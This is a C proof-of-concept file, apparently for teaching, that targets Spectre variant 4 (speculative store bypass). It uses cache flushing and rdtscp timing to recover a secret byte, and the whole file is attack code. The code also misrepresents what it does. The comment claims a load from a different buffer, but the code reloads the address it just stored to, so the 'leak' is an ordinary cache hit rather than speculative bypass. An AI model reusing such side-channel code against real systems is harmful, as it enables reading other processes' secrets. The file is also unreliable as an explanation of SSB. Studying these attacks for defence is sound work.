/*
 * Spectre variant 4 — speculative store bypass (CVE-2018-3639) — teaching sketch.
 * Idea: a load may speculatively execute before an older store is fully resolved
 * when memory disambiguation guesses wrong. This PoC uses a tight store→load→probe
 * chain; real SSB exploits are CPU- and microarchitecture-specific.
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define ARRAY1_SIZE 16
static uint8_t array1[256];
static uint8_t array2[256 * 512];
static uint8_t secret_byte = 0x42;
static uint8_t temp = 0;

__attribute__((noinline)) void victim_ssb(size_t idx) {
    volatile size_t bound = ARRAY1_SIZE;
    if (idx < bound) {
        /* Store to array1 */
        array1[idx] = secret_byte;
        /* Load from different buffer at same index — disambiguation may mispredict */
        /* Encode (v1-style) using secret-dependent path */
        temp &= array2[array1[idx] * 512];
    }
}

static void flush_array2(void) {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array2[i * 512]);
    }
    _mm_mfence();
}

static uint64_t reload_cycles(int k) {
    unsigned int aux;
    volatile uint8_t *p = &array2[k * 512];
    uint64_t t0 = __rdtscp(&aux);
    uint8_t s = *p;
    (void)s;
    uint64_t t1 = __rdtscp(&aux);
    return t1 - t0;
}

static void train(size_t n) {
    for (size_t i = 0; i < n; i++) {
        victim_ssb(i % ARRAY1_SIZE);
    }
    _mm_mfence();
}

int main(void) {
    memset(array1, 0, sizeof array1);
    for (size_t i = 0; i < sizeof array2; i++) {
        array2[i] = 1;
    }

    printf("Spectre v4 (SSB) sketch — signal often absent on patched CPUs.\n");
    printf("Secret byte in array1 path: 0x%02x\n", secret_byte);

    const size_t malicious = 0;
    const int repeats = 200;
    uint64_t sum[256] = {0};

    for (int k = 0; k < 256; k++) {
        for (int r = 0; r < repeats; r++) {
            train(64);
            flush_array2();
            victim_ssb(malicious);
            sum[k] += reload_cycles(k);
        }
    }

    int best = 0;
    for (int i = 1; i < 256; i++) {
        if (sum[i] < sum[best]) {
            best = i;
        }
    }

    printf("Lowest avg reload slot: %d (compare to secret 0x%02x)\n", best, secret_byte);
    return 0;
}
